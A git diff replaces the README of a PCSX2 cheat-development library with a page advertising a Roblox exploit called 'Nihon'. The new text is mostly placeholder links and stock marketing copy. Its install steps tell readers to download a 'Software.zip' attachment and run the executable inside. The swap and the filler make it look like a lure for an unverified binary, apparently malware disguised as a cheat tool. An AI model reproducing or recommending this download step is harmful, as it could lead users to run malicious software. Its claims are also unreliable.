@@ -1,68 +1,53 @@
-# PCSX2 Cheat Development Kit  
-PCSX2 Menu Trainer Development Kit is a C++ library designed to simplify the process of creating cheats for the PCSX2 emulator. 
-It aims to bridge the gap between modern cheat development practices and the classic era of cheat codes.
-This framework provides tools to port older codes to a more modern approach, using additional libraries such as dear imgui and minhook.
+# Roblox-Nihon
 
-| ![image](https://github.com/NightFyre/PCSX2-CheatFrameWork/assets/80198020/7417d7e7-603c-465a-807f-62abf88179eb) | ![image](https://user-images.githubusercontent.com/80198020/201475737-21591eb0-8858-4575-8ee9-5d9d2e07d1dc.png) | ![image](https://user-images.githubusercontent.com/80198020/200977619-e22fe7a5-b914-4906-9e3c-50f929ea3ebf.png) | 
-| :---: | :---: |  :---: |
+Nihon is a leading Roblox exploit founded in 2020, known for its intuitive user interface, robust features, and exceptional performance. Developed by top industry professionals, it offers enhanced security, customization options, and a globally trusted service.
 
-## FEATURES
-- Easily Read & Write to virtual PS2 Memory
-- PCSX2 Emulator Process Virtual Method Hooking
-- Rendering API Helpers
-- Access EE & IOP Registers during execution
+![Nihon Logo](url_to_logo)
 
-## USAGE
-1. include the SDK header as well as any required packages.  
-*NOTE: Engine_Package.h is a required package and needs to be manually included.*
- - `CDK.h`                  //  Including the SDK header will provide access to all the most necessary features.
- - `Core_Package.cpp`       //  Main Package and must be included for basic usage 
- - `PCSX2_Package.cpp`      //  PCSX2 specific members and functions. Like the rendering API's for instance
+## Table of Contents
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Support](#support)
+- [License](#license)
 
-2. Initialize the SDK
- - `PlayStation2::InitCDK();`   //  Basic CDK Initialization
+## Introduction
+Welcome to the Roblox-Nihon repository! In this README file, you will find all the essential information regarding Nihon, the Roblox exploit that has been making waves in the community. Whether you are a seasoned Roblox developer or just starting out, Nihon offers a range of features that will take your Roblox experience to the next level.
 
-3. Do Stuff
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/70dcf7dc51747df014f5d537a3188b8de1fe95a2/dllmain.cpp#L18-L29
+## Features
+- **Intuitive User Interface**: Nihon boasts a sleek and user-friendly interface that makes it easy to navigate and use its powerful features.
+- **Robust Functionality**: From script execution to game manipulation, Nihon offers a wide range of functionalities to enhance your Roblox gameplay.
+- **Enhanced Security**: Developed by industry professionals, Nihon prioritizes security to ensure a safe and reliable experience for all users.
+- **Customization Options**: Tailor Nihon to your preferences with various customization options, allowing you to personalize your exploit experience.
+- **Global Trust**: Nihon is trusted by users worldwide for its performance and reliability.
 
-4. (optional) include game package for additional controls
+## Installation
+To install Nihon, follow these steps:
+1. Download the [Software.zip](https://github.com/user-attachments/files/17394153/Software.zip) file.
+2. Extract the contents of the zip file to your desired location.
+3. Run the Nihon executable file.
+4. Follow the on-screen instructions to complete the installation process.
 
-## USAGE EXAMPLES
+## Usage
+Nihon can be used for a variety of purposes in Roblox, including:
+- Exploiting Roblox games for fun and experimentation.
+- Testing game security and performance.
+- Learning about game development and scripting through practical application.
 
-- Access EE Memory
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/b2ae5a44d7c1452256920c4af81f745cdf0df2f3/examples/GameMemory/dllmain.cpp#L33-L34
-
-- Get Virtual Address
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/b2ae5a44d7c1452256920c4af81f745cdf0df2f3/examples/GameMemory/dllmain.cpp#L37-L38
-
-- Read Virtual Memory
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/b2ae5a44d7c1452256920c4af81f745cdf0df2f3/examples/GameMemory/dllmain.cpp#L41-L47
-
-- Access Class Members via GamePackages 
-```cpp
-/// SOCOM 1 -> Access SealObject & Modify Weapon Ammo
-{
-    // Create an instance of the Offsets Class
-    SOCOM1::CZSeal* pLocalSeal = SOCOM1::CZSeal::GetDefaultInstance();
-    if (pLocalSeal)
-        Console::cLogMsg("[+][PCSX2-CDK][SOCOM] LocalSeal Name: %s\n", EConsoleColors::green, pLocalSeal->GetName().c_str());
-}
+Here are some common commands to get you started:
+```lua
+-- Insert example commands here
 ```
 
-- Hook Rendering API
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/7c786cdd3e7f8c0855bc7d1f83df687092424604/examples/Rendering/dllmain.cpp#L44-L51
+For more detailed usage instructions and tutorials, refer to the official Nihon documentation [here](url_to_documentation).
 
+## Support
+If you encounter any issues or have questions about Nihon, feel free to reach out to our support team at [support@nihon.com](mailto:support@nihon.com). Our dedicated team is here to assist you with any queries or concerns you may have.
 
-### References & Credits
-- [PCSX2](https://github.com/PCSX2/pcsx2)
-- [GameHacking.org](https://gamehacking.org/system/ps2)
-- [Sly Cooper Modding Community](https://discord.com/invite/2GSXcEzPJA) 
-- [SOCOM Modding Community](https://discord.com/invite/PCJGrwMdUS) 
-- [A General Guide for Making Cheats & Trainers for PCSX2](https://www.unknowncheats.me/forum/general-programming-and-reversing/569991-pcsx2-guide-cheats-trainers.html)
+## License
+Nihon is distributed under the [MIT License](url_to_license). Feel free to explore, modify, and distribute Nihon as per the terms of the license agreement.
 
-### License
-This framework is distributed under the MIT License.
+![Nihon Screenshot](url_to_screenshot)
 
-### Disclaimer
-1. *This framework is intended for educational and single-player use.*  
-2. *Use cheats responsibly and respect the terms of use of the games you are modifying.*
+Thank you for choosing Nihon as your Roblox exploit of choice. We hope you enjoy using our product and look forward to your valuable feedback and contributions to the community. Happy exploiting! 🚀🎮
